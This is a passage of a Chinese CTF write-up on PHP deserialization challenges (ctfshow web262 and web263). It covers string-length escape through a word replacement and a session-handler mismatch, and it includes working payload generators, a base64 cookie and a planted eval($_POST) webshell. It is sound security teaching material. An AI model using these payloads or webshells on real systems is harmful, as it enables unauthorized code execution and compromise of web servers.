class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line"></span><br><span class="line">  setcookie(<span class="string">&#x27;msg&#x27;</span>,base64_encode(<span class="variable">$umsg</span>));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>注释里有message.php，尝试进行访问：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$msg</span> = unserialize(base64_decode(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;msg&#x27;</span>]));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$msg</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>在第一段代码中， **$umsg = str_replace(‘fuck’, ‘loveU’, serialize($msg));**可以看到存在字符替换使字符串变长的情况，考虑反序列化字符串变长。</li>
+</ul>
+<p>参照两段代码可以知道，cookie处的值可控，当传入的token=admin时，输出flag。</p>
+<p>序列化的构造结果为 **;s:5:”token”;s:5:”admin”;}**共26个字符。</p>
+<p>我们需要将接收到的cookie值构造成上述结果。</p>
+<ul>
+<li>那么就可以利用反序列化字符串变长的原理，在$t处传入26个fuck，在序列化时就会将fuck替换成字符串长度为5的loveU，替换后将在$t变量处多出26个字符长度的空间。</li>
+<li>而我们知道，PHP在反序列化时，从左往右读取数据类型及长度，且只读取其中规定长度的数据，即当数据的长度大于规定的长度，后面还有数据也不再读取，而后面不再读取的数据，就会被挤到下一个数据项中。</li>
+<li>因此;s:5:”token”;s:5:”admin”;}就会被挤到cookie处，成为cookie的数据项，而原本的;s:5:”token”;s:4:”user”;}由于前面的}已经形成闭合，所以这串字符就被舍弃掉了。</li>
+<li></li>
+</ul>
+<h4 id="解题-2"><a href="#解题-2" class="headerlink" title="解题"></a>解题</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//替换前：</span></span><br><span class="line">O:<span class="number">7</span>:<span class="string">&quot;message&quot;</span>:<span class="number">4</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;from&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;msg&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;to&quot;</span>;s:<span class="number">135</span>:<span class="string">&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;&#125;<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:4:&quot;</span>user<span class="string">&quot;;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//替换后：</span></span><br><span class="line"><span class="string">O:7:&quot;</span>message<span class="string">&quot;:4:&#123;s:4:&quot;</span><span class="keyword">from</span><span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>msg<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:2:&quot;</span>to<span class="string">&quot;;s:135:&quot;</span>loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU<span class="string">&quot;;s:5:&quot;</span>token<span class="string">&quot;;s:5:&quot;</span>admin<span class="string">&quot;;&#125;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;token&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>然后进行base64编码进行传参即可.</li>
+</ul>
+<p><strong>生成代码：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​       <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line"></span><br><span class="line">​       <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line"></span><br><span class="line">​       <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$t</span> = <span class="string">&#x27;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=serialize(<span class="variable">$msg</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$umsg</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxMzU6ImxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVWxvdmVVbG92ZVVsb3ZlVSI7czo1OiJ0b2tlbiI7czo1OiJhZG1pbiI7fSI7czo1OiJ0b2tlbiI7czo0OiJ1c2VyIjt9</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>在message.php页面对cookie进行msg的传参即可。</li>
+</ul>
+<p><img src="12.png"></p>
+<h3 id="web263-php-session反序列化"><a href="#web263-php-session反序列化" class="headerlink" title="web263(php-session反序列化)"></a>web263(php-session反序列化)</h3><h4 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h4><ul>
+<li>session反序列化</li>
+</ul>
+<p>在php.ini中存在三项配置项：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">session.save_path=<span class="string">&quot;&quot;</span>  --设置session的存储路径</span><br><span class="line"></span><br><span class="line">session.save_handler=<span class="string">&quot;&quot;</span> --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line"></span><br><span class="line">session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为<span class="number">0</span>不启动</span><br><span class="line"></span><br><span class="line">session.serialize_handler  <span class="keyword">string</span> --定义用来序列化/反序列化的处理器名字。默认使用php </span><br><span class="line"></span><br><span class="line">session.serialize_handler=php  表明session的默认序列话引擎使用的是php序列话引擎</span><br></pre></td></tr></table></figure>
+
+
+
+<p> 在上述的配置中，session.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_serialize(php&gt;<span class="number">5.5</span>.<span class="number">4</span>):存储方式是，经过serialize()函数序列化处理的值 </span><br><span class="line"></span><br><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li>在PHP中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(‘session.serialize_handler’, ‘需要设置的引擎’);。</li>
+</ul>
+<h5 id="代码测试"><a href="#代码测试" class="headerlink" title="代码测试"></a>代码测试</h5><ul>
+<li>本地代码测试，session文件在Extensions\tmp\tmp目录下：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handlers&#x27;</span>,<span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;spoock&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>PHP：</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name|s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>php_serialize:</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;spoock&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<ul>
+<li><strong>php_binary</strong></li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">names:<span class="number">6</span>:<span class="string">&quot;张三spoock&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>由于name的长度是4，4在ASCII表中对应的就是EOT。根据php_binary的存储规则，最后就是names:6:”spoock”;。（前面还有一个类似于口字的字符没办法显示）</p>
+<h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确进行反序列化。</p>
+<h4 id="解题-3"><a href="#解题-3" class="headerlink" title="解题"></a>解题</h4><p>index.php:</p>
+<p><img src="13.png"></p>
+<p>check.php:post传参，</p>
+<p><img src="14.png"></p>
+<p>inc.php:</p>
+<p><img src="15.png"></p>
+<ul>
+<li>在inc.php中看到关键切入点，根据session.serialize_handler关键字可以猜测题目为session的反序列化。按照前面的知识，这里把session的session.serialize_handler设置为php，暗示了默认的php.ini里面的肯定不是php，大概率是php_serialize。在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，因此通过构造数据，进行攻击：</li>
+</ul>
+<p><strong>session参数可控，</strong></p>
+<ul>
+<li>inc.php里面有session-start()，而且存在User类，有一个文件写入：</li>
+</ul>
+<p><img src="16.png"></p>
+<ul>
+<li>因此可以将传入的第一个参数设置为文件名，第二个参数设置为一句话木马：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">​    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;10.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">​        <span class="keyword">$this</span>-&gt;password = <span class="string">&#x27;&lt;?php eval($_POST[0]);?&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">​    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span>.serialize(<span class="keyword">new</span> User()));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>因为这里的引擎使用的是php，得到的session的文件的值带有|，但是php.ini中使用的序列化引擎为php_serialize，因此只需要将php引擎模式|后的内容进行序列化就可以了：（存储形式的不一样，因此构造的序列化的链的写法不同）</strong></p>
+<ul>
+<li>首先访问index.php，然后改cookie，再刷新一次index.php，再访问一次check.php，这样马就写好了:</li>
+</ul>
+<p><img src="17.png"></p>
+<ul>
+<li>访问check.php：带有参数</li>
+</ul>
+<p><img src="18.png"></p>
+<ul>
+<li>在代码中是以log-文件名保存的最终文件名，所以最后访问log-10.php，发现代码成功执行，连接蚁剑得到flag。</li>
+</ul>
+<p><img src="19.png"></p>
+<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/116246.htm">深入浅析PHP的session反序列化漏洞问题_php实例_脚本之家 (jb51.net)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/njh18790816639/article/details/115661917">https://blog.csdn.net/njh18790816639/article/details/115661917</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web254"><span class="toc-number">1.</span> <span class="toc-text">web254</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web255"><span class="toc-number">2.</span> <span class="toc-text">web255</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web256"><span class="toc-number">3.</span> <span class="toc-text">web256</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web257"><span class="toc-number">4.</span> <span class="toc-text">web257</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web258%EF%BC%88%E5%8A%A0%E5%8F%B7%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B%EF%BC%89"><span class="toc-number">5.</span> <span class="toc-text">web258（加号绕过检测）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">5.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">5.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web259%EF%BC%88php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%89"><span class="toc-number">6.</span> <span class="toc-text">web259（php原生类反序列化）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-1"><span class="toc-number">6.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">6.1.1.</span> <span class="toc-text">PHP原生类反序列化利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CRLF"><span class="toc-number">6.1.2.</span> <span class="toc-text">CRLF</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-1"><span class="toc-number">6.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">6.3.</span> <span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web260"><span class="toc-number">7.</span> <span class="toc-text">web260</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web261"><span class="toc-number">8.</span> <span class="toc-text">web261</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web262%EF%BC%88%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8-%E5%8F%98%E9%95%BF%EF%BC%89"><span class="toc-number">9.</span> <span class="toc-text">web262（反序列化字符串逃逸-变长）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">9.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-2"><span class="toc-number">9.2.</span> <span class="toc-text">解题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web263-php-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">10.</span> <span class="toc-text">web263(php-session反序列化)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86-2"><span class="toc-number">10.1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%B5%8B%E8%AF%95"><span class="toc-number">10.1.1.</span> <span class="toc-text">代码测试</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">10.1.2.</span> <span class="toc-text">漏洞成因</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98-3"><span class="toc-number">10.2.</span> <span class="toc-text">解题</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-1"><span class="toc-number">10.3.</span> <span class="toc-text">参考文章</span></a></li></ol></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
